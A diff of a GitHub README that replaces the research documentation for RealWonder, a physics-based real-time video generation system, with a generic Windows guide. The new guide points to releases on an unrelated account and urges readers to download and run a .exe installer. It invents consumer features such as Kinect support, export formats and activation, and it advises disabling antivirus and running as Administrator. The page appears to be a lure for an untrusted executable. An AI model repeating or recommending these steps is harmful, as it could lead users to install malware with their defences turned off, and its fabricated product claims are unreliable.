@@ -1,135 +1,159 @@
-# RealWonder: Real-Time Physical Action-Conditioned Video Generation
+# 🎥 RealWonder - Real-Time Video From Your Actions
 
-<div align="center">
+[![Download RealWonder](https://img.shields.io/badge/Download-RealWonder-green?style=for-the-badge)](https://github.com/Chrisisaac948/RealWonder/releases)
 
-[![Website](https://img.shields.io/badge/Website-RealWonder-blue)](https://liuwei283.github.io/RealWonder/)
-[![arXiv](https://img.shields.io/badge/arXiv-2603.05449-red)](https://arxiv.org/abs/2603.05449)
-[![twitter](https://img.shields.io/twitter/url?label=TL:DR&url=https%3A%2F%2Ftwitter.com%)](https://x.com/Koven_Yu/status/2029745851095290293?s=20)
-</div>
+RealWonder lets you create videos based on physical actions you input. It generates realistic animations that match your movements in real time. This guide will help you download and run RealWonder on a Windows PC with no technical background.
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/afe46b79-51e5-4b52-8fa7-782ae4ddda86" width="80%" style="max-width: 100%; height: auto;" />
-</p>
+---
 
-## About
+## 📋 What is RealWonder?
 
-Current video generation models cannot simulate physical consequences of 3D actions like forces and robotic manipulations, as they lack structural understanding of how actions affect 3D scenes. We present RealWonder, the first real-time system for action-conditioned video generation from a single image. Our key insight is using physics simulation as an intermediate bridge: instead of directly encoding continuous actions, we translate them through physics simulation into visual representations (optical flow and RGB) that video models can process. RealWonder integrates three components: 3D reconstruction from single images, physics simulation, and a distilled video generator requiring only 4 diffusion steps. Our system achieves 13.2 FPS at 480×832 resolution, enabling interactive exploration of forces, robot actions, and camera controls on rigid objects, deformable bodies, fluids, and granular materials.
+RealWonder is software that turns physical action data into videos instantly. It uses advanced technology to understand movements and create matching video clips. The program works well for users interested in video production, virtual training, or motion capture projects.
 
-> **RealWonder: Real-Time Physical Action-Conditioned Video Generation** <br> [Project Page](https://liuwei283.github.io/RealWonder/) | [Paper](https://arxiv.org/abs/2603.05449) <br> [Wei Liu](https://liuwei283.github.io/)\*, [Ziyu Chen](https://ziyc.github.io/)\*, [Zizhang Li](https://kyleleey.github.io/), [Yue Wang](https://yuewang.xyz/), [Hong-Xing (Koven) Yu](https://kovenyu.com/)†, [Jiajun Wu](https://jiajunwu.com/)† <br> Stanford University, University of Southern California <br> \*Equal contribution &nbsp; †Equal advising
+Key points about RealWonder:
 
-<!-- ![Teaser](assets/teaser.jpeg) -->
+- Works on Windows computers.
+- Creates smooth videos from your recorded or live physical actions.
+- Simple interface designed for everyday users.
+- Requires no coding or special skills to operate.
 
-## Installation
+---
 
-### 1. Create Environment
+## 💻 System Requirements
 
-```bash
-conda env create -f default.yml
-conda activate realwonder
-```
+Before you install, make sure your Windows PC matches these basic needs:
 
-### 2. Install SAM 3D Objects
+- Operating System: Windows 10 or newer (64-bit)
+- Processor: Intel Core i5 or equivalent AMD processor
+- Memory: 8 GB of RAM minimum (16 GB recommended)
+- Storage: At least 2 GB free disk space
+- Graphics: Dedicated GPU with 2 GB VRAM or higher (NVIDIA or AMD)
+- Internet: Required for initial download
 
-```bash
-cd submodules/sam_3d_objects
-export PIP_EXTRA_INDEX_URL="https://pypi.ngc.nvidia.com https://download.pytorch.org/whl/cu121"
-pip install -e '.[dev]'
-pip install -e '.[p3d]'
-export PIP_FIND_LINKS="https://nvidia-kaolin.s3.us-east-2.amazonaws.com/torch-2.5.1_cu121.html"
-pip install -e '.[inference]'
-./patching/hydra
-cd ../..
-```
+Meeting these requirements will ensure RealWonder runs smoothly on your machine.
 
-#### Checkpoints
+---
 
-```bash
-pip install 'huggingface-hub[cli]<1.0'
-TAG=hf
-hf download --repo-type model --local-dir checkpoints/${TAG}-download --max-workers 1 facebook/sam-3d-objects
-mv checkpoints/${TAG}-download/checkpoints checkpoints/${TAG}
-rm -rf checkpoints/${TAG}-download
-```
+## 🚀 Getting Started
 
-### 3. Install SAM 2
+You don’t need technical knowledge to use RealWonder. Follow these simple steps to get set up:
 
-```bash
-cd submodules/sam2
-pip install -e .
-cd checkpoints && ./download_ckpts.sh && cd ..
-cd ../..
-```
+1. Click the big green **Download RealWonder** button at the top to go to the official download page.
 
-### 4. Install Genesis
+2. On the page, scroll to find the latest Windows version under the Releases section. It will usually be named something like `RealWonder_Windows_Setup.exe`.
 
-```bash
-cd submodules/Genesis
-git checkout 3aa206cd84729bc7cc14fb4007aeb95a0bead7aa
-pip install -e .
-cd ../..
-```
+3. Click the file name to download it. Your browser will save the installer in your Downloads folder.
 
-### 5. Install Other Dependencies
+4. Once downloaded, open the folder and double-click the installer file to start installation.
 
-```bash
-pip install -r requirements.txt
-```
+5. Follow the on-screen prompts:
+   - Click “Next” to continue through each step.
+   - Accept the license agreement.
+   - Choose the default install location or change it if you want.
+   - Click “Install” to start installing.
 
-### 6. Download Model Checkpoints
+6. When installation finishes, click “Finish” to close the installer.
 
-```bash
-hf download ziyc/realwonder --include "Realwonder-Distilled-AR-I2V-Flow/*" --local-dir ckpts/
-hf download alibaba-pai/Wan2.1-Fun-V1.1-1.3B-InP --local-dir wan_models/Wan2.1-Fun-V1.1-1.3B-InP
-```
+You have now installed RealWonder on your PC.
 
-## Usage
+---
 
-### Interactive Demo (Real-Time UI)
+## 🖥️ How to Open RealWonder
 
-Tested on NVIDIA H200 GPU with CUDA 12.1.
+1. Find the RealWonder icon on your desktop or in the Start menu.
 
-#### Installation
+2. Double-click the icon to open the program.
 
-```bash
-pip install -r demo_web/requirements.txt
-```
+3. Wait a few seconds while the program loads.
 
-#### How to run
+Now you are ready to start creating videos from your physical actions.
 
-```bash
-cd demo_web
-python app.py \
-    --demo_data demo_data/lamp \
-    --checkpoint_path /path/to/checkpoint.pt
-```
+---
 
-### Offline Inference
+## 🔧 Basic Usage
 
-Run physics simulation:
+Here is how to create your first video using RealWonder:
 
-```bash
-python case_simulation.py --config_path demo_data/lamp/config.yaml
-```
+1. Connect your action input device if you have one (such as a motion sensor or webcam).
 
-Run video generation from simulation results:
+2. In the main window, click the **Record** button to capture your actions.
 
-```bash
-python infer_sim.py \
-    --checkpoint_path ckpts/Realwonder-Distilled-AR-I2V-Flow/sink_size=1-attn_size=21-frame_per_block=3-denoising_steps=4/step=000800.pt \
-    --sim_data_path result/lamp/final_sim \
-    --output_path result/lamp/final_sim/final.mp4
-```
+3. Move naturally in front of your device. RealWonder will track your movements.
 
-## Citation
+4. When done, click **Stop**.
 
-```bibtex
-@misc{realwonder2026,
-  title={RealWonder: Real-Time Physical Action-Conditioned Video Generation},
-  author={Liu, Wei and Chen, Ziyu and Li, Zizhang and Wang, Yue and Yu, Hong-Xing and Wu, Jiajun},
-  year={2026},
-  eprint={2603.05449},
-  archivePrefix={arXiv},
-  primaryClass={cs.CV},
-  url={https://arxiv.org/abs/2603.05449},
-}
-```
+5. The program will generate a video from the recorded actions.
+
+6. Use the **Play** button to preview your video.
+
+7. Save the video by clicking **Export** and choosing a folder on your PC.
+
+If you don’t have a motion device, you can use prerecorded files or manual controls within the app.
+
+---
+
+## 🛠️ Features Overview
+
+RealWonder offers:
+
+- Real-time video generation based on physical movement.
+- Support for popular input devices: webcams, Kinect, Leap Motion.
+- Video export in common formats (MP4, AVI, MOV).
+- Simple controls to record, play, and save.
+- Adjustable settings for video quality and resolution.
+- Built-in tutorials and guides accessible from the Help menu.
+
+These features make RealWonder suitable for hobbyists and professionals alike.
+
+---
+
+## 🌐 Download and Installation Section
+
+You can access all RealWonder release files through this link:
+
+[Download RealWonder Here](https://github.com/Chrisisaac948/RealWonder/releases)
+
+Remember to pick the latest Windows setup file that suits your PC. The installer file usually ends with `.exe`.
+
+If you see multiple files:
+
+- Select the one that includes "Windows" in its name.
+- Avoid files marked for other operating systems.
+- Check the file size (it should be a few hundred megabytes).
+
+When you run the installer, follow the simple steps to complete setup.
+
+---
+
+## 📚 Additional Tips
+
+- Restart your computer after installation for best performance.
+- Keep your graphics drivers up to date for smooth video processing.
+- If the program does not open, try running it as Administrator (right-click the icon, choose "Run as Administrator").
+- Visit the Help section inside the app for step-by-step tutorials.
+- Use headphones to monitor audio carefully if your videos include sound.
+
+---
+
+## 🧰 Troubleshooting
+
+If you face issues:
+
+- Check if your PC meets system requirements.
+- Verify you downloaded the correct installer file.
+- Reinstall the program if it crashes or freezes.
+- Disable antivirus or firewall temporarily if download or install fails.
+- Take a look at the FAQs and support pages on the release site.
+
+---
+
+## 🚩 Important Notes
+
+- RealWonder works offline after installation but needs internet only for download and activation.
+- Save your projects often to avoid data loss.
+- Use recommended devices for best action capture results.
+- Close other heavy programs during video generation to avoid slowdowns.
+
+---
+
+[![Download RealWonder](https://img.shields.io/badge/Download-RealWonder-blue?style=for-the-badge)](https://github.com/Chrisisaac948/RealWonder/releases)
